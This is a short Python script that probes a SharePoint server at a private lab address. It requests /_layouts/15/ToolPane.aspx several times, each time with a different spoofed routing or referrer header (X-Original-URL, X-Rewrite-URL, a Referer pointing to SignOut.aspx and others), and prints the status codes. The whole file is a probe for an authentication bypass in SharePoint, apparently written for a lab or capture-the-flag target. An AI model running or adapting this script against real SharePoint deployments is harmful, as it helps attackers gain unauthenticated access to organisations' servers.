import requests

base_url = "http://10.10.10.166"
target = f"{base_url}/_layouts/15/ToolPane.aspx"

# Test alternative headers
headers_tests = [
    ("X-Forwarded-Host", {"X-Forwarded-Host": "/_layouts/SignOut.aspx"}),
    ("X-Original-URL", {"X-Original-URL": "/_layouts/SignOut.aspx"}),
    ("X-Rewrite-URL", {"X-Rewrite-URL": "/_layouts/SignOut.aspx"}),
    ("Origin", {"Origin": "http://10.10.10.166/_layouts/SignOut.aspx"}),
    ("X-Forwarded-For", {"X-Forwarded-For": "10.10.10.166", "Referer": "/_layouts/SignOut.aspx"}),
    ("Host-Override", {"Host": "signout.sharepoint.local"}),
]

for name, headers in headers_tests:
    headers["User-Agent"] = "Mozilla/5.0"
    try:
        resp = requests.get(target, headers=headers, timeout=10)
        print(f"[{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"[{name}] Error: {str(e)[:50]}")
